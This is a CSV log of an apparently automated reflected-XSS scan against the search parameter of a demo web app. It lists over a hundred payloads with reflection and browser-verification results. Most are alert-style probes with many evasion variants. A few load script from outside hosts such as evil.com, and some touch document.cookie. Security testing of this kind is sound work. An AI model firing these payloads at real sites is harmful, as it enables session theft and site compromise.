@@ -1,0 +1,566 @@
+Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.227,0.947,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.258,0.978,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.264,0.984,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.304,1.023,https://demo-knsl.onrender.com/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.307,1.026,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.349,1.068,https://demo-knsl.onrender.com/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.396,1.115,https://demo-knsl.onrender.com/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.258,2026-01-10 17:01:04.401,0.143,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:04.679,1.398,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.307,2026-01-10 17:01:04.684,0.377,https://demo-knsl.onrender.com/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.227,2026-01-10 17:01:04.803,0.576,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.349,2026-01-10 17:01:04.808,0.459,https://demo-knsl.onrender.com/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.304,2026-01-10 17:01:04.820,0.517,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.396,2026-01-10 17:01:04.827,0.431,https://demo-knsl.onrender.com/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.264,2026-01-10 17:01:04.884,0.620,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.684,2026-01-10 17:01:04.888,0.204,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.401,2026-01-10 17:01:04.951,0.550,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.820,2026-01-10 17:01:04.954,0.134,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.679,2026-01-10 17:01:04.961,0.282,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.827,2026-01-10 17:01:04.966,0.139,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.808,2026-01-10 17:01:05.183,0.375,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.803,2026-01-10 17:01:05.186,0.383,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.888,2026-01-10 17:01:05.188,0.299,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.954,2026-01-10 17:01:05.192,0.238,https://demo-knsl.onrender.com/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.884,2026-01-10 17:01:05.251,0.367,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.966,2026-01-10 17:01:05.255,0.289,https://demo-knsl.onrender.com/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:05.320,2.039,https://demo-knsl.onrender.com/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:04.961,2026-01-10 17:01:05.412,0.451,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.183,2026-01-10 17:01:05.415,0.231,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.192,2026-01-10 17:01:05.417,0.225,https://demo-knsl.onrender.com/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:04.951,2026-01-10 17:01:05.420,0.469,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.255,2026-01-10 17:01:05.424,0.169,https://demo-knsl.onrender.com/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.417,2026-01-10 17:01:05.498,0.081,https://demo-knsl.onrender.com/search,GET,q,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:05.251,2026-01-10 17:01:05.534,0.283,https://demo-knsl.onrender.com/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.186,2026-01-10 17:01:05.539,0.352,https://demo-knsl.onrender.com/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.320,2026-01-10 17:01:05.541,0.221,https://demo-knsl.onrender.com/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.420,2026-01-10 17:01:05.545,0.125,https://demo-knsl.onrender.com/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.424,2026-01-10 17:01:05.579,0.155,https://demo-knsl.onrender.com/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.498,2026-01-10 17:01:05.625,0.127,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.534,2026-01-10 17:01:05.652,0.118,https://demo-knsl.onrender.com/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.541,2026-01-10 17:01:05.663,0.122,https://demo-knsl.onrender.com/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.539,2026-01-10 17:01:05.669,0.130,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.545,2026-01-10 17:01:05.675,0.130,https://demo-knsl.onrender.com/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.415,2026-01-10 17:01:05.680,0.265,https://demo-knsl.onrender.com/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.579,2026-01-10 17:01:05.691,0.112,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.652,2026-01-10 17:01:05.721,0.069,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:05.625,2026-01-10 17:01:05.745,0.120,https://demo-knsl.onrender.com/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.669,2026-01-10 17:01:05.769,0.100,https://demo-knsl.onrender.com/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.663,2026-01-10 17:01:05.779,0.116,https://demo-knsl.onrender.com/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.680,2026-01-10 17:01:05.780,0.100,https://demo-knsl.onrender.com/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.675,2026-01-10 17:01:05.784,0.109,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.691,2026-01-10 17:01:05.809,0.118,https://demo-knsl.onrender.com/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.721,2026-01-10 17:01:05.825,0.104,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.745,2026-01-10 17:01:05.912,0.167,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.769,2026-01-10 17:01:05.913,0.143,https://demo-knsl.onrender.com/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.784,2026-01-10 17:01:05.916,0.132,https://demo-knsl.onrender.com/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.780,2026-01-10 17:01:05.916,0.136,https://demo-knsl.onrender.com/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.779,2026-01-10 17:01:05.920,0.140,https://demo-knsl.onrender.com/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.809,2026-01-10 17:01:05.931,0.123,https://demo-knsl.onrender.com/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.825,2026-01-10 17:01:05.931,0.106,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.188,2026-01-10 17:01:05.937,0.749,https://demo-knsl.onrender.com/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:05.913,2026-01-10 17:01:06.055,0.143,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.912,2026-01-10 17:01:06.055,0.143,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.916,2026-01-10 17:01:06.059,0.143,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.920,2026-01-10 17:01:06.060,0.140,https://demo-knsl.onrender.com/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.931,2026-01-10 17:01:06.064,0.133,https://demo-knsl.onrender.com/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.931,2026-01-10 17:01:06.064,0.133,https://demo-knsl.onrender.com/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.937,2026-01-10 17:01:06.068,0.131,https://demo-knsl.onrender.com/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:03.281,2026-01-10 17:01:06.178,2.897,https://demo-knsl.onrender.com/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:05.412,2026-01-10 17:01:06.188,0.776,https://demo-knsl.onrender.com/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:06.055,2026-01-10 17:01:06.227,0.172,https://demo-knsl.onrender.com/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.055,2026-01-10 17:01:06.228,0.172,https://demo-knsl.onrender.com/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.059,2026-01-10 17:01:06.252,0.192,https://demo-knsl.onrender.com/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.060,2026-01-10 17:01:06.256,0.196,https://demo-knsl.onrender.com/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.064,2026-01-10 17:01:06.256,0.192,https://demo-knsl.onrender.com/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.178,2026-01-10 17:01:06.280,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.188,2026-01-10 17:01:06.285,0.098,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.227,2026-01-10 17:01:06.333,0.106,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.228,2026-01-10 17:01:06.336,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.256,2026-01-10 17:01:06.371,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.252,2026-01-10 17:01:06.371,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.256,2026-01-10 17:01:06.388,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.280,2026-01-10 17:01:06.390,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.285,2026-01-10 17:01:06.396,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.333,2026-01-10 17:01:06.492,0.160,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.336,2026-01-10 17:01:06.498,0.163,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.371,2026-01-10 17:01:06.513,0.142,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.371,2026-01-10 17:01:06.519,0.148,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.396,2026-01-10 17:01:06.519,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.388,2026-01-10 17:01:06.522,0.134,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.390,2026-01-10 17:01:06.522,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.498,2026-01-10 17:01:06.656,0.157,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.492,2026-01-10 17:01:06.656,0.163,https://demo-knsl.onrender.com/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.519,2026-01-10 17:01:06.663,0.145,https://demo-knsl.onrender.com/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.513,2026-01-10 17:01:06.663,0.151,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.522,2026-01-10 17:01:06.667,0.145,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.519,2026-01-10 17:01:06.673,0.154,https://demo-knsl.onrender.com/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.522,2026-01-10 17:01:06.684,0.162,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:05.916,2026-01-10 17:01:06.770,0.854,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:06.656,2026-01-10 17:01:06.801,0.146,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.656,2026-01-10 17:01:06.803,0.147,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.673,2026-01-10 17:01:06.805,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.663,2026-01-10 17:01:06.806,0.143,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.684,2026-01-10 17:01:06.809,0.124,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.667,2026-01-10 17:01:06.822,0.156,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.770,2026-01-10 17:01:06.896,0.126,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.068,2026-01-10 17:01:06.906,0.838,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:06.801,2026-01-10 17:01:06.906,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.064,2026-01-10 17:01:06.907,0.843,https://demo-knsl.onrender.com/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:06.805,2026-01-10 17:01:06.908,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.803,2026-01-10 17:01:06.919,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.822,2026-01-10 17:01:06.935,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.896,2026-01-10 17:01:07.011,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.906,2026-01-10 17:01:07.031,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.908,2026-01-10 17:01:07.039,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.906,2026-01-10 17:01:07.040,0.134,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.919,2026-01-10 17:01:07.046,0.127,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.907,2026-01-10 17:01:07.046,0.139,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.935,2026-01-10 17:01:07.051,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.011,2026-01-10 17:01:07.111,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.031,2026-01-10 17:01:07.133,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.039,2026-01-10 17:01:07.141,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.040,2026-01-10 17:01:07.142,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.046,2026-01-10 17:01:07.146,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.051,2026-01-10 17:01:07.156,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.046,2026-01-10 17:01:07.157,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.112,2026-01-10 17:01:07.244,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.133,2026-01-10 17:01:07.258,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.156,2026-01-10 17:01:07.301,0.145,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.157,2026-01-10 17:01:07.302,0.145,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.142,2026-01-10 17:01:07.304,0.161,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.141,2026-01-10 17:01:07.305,0.163,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.146,2026-01-10 17:01:07.314,0.168,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.301,2026-01-10 17:01:07.413,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.244,2026-01-10 17:01:07.413,0.170,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.304,2026-01-10 17:01:07.416,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.258,2026-01-10 17:01:07.417,0.158,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.302,2026-01-10 17:01:07.420,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.305,2026-01-10 17:01:07.420,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.314,2026-01-10 17:01:07.422,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.413,2026-01-10 17:01:07.529,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.413,2026-01-10 17:01:07.529,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.416,2026-01-10 17:01:07.532,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.417,2026-01-10 17:01:07.533,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.420,2026-01-10 17:01:07.536,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.422,2026-01-10 17:01:07.536,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.420,2026-01-10 17:01:07.540,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.663,2026-01-10 17:01:07.551,0.888,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:07.536,2026-01-10 17:01:07.653,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.806,2026-01-10 17:01:07.653,0.846,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:07.536,2026-01-10 17:01:07.653,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.533,2026-01-10 17:01:07.657,0.124,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.529,2026-01-10 17:01:07.661,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
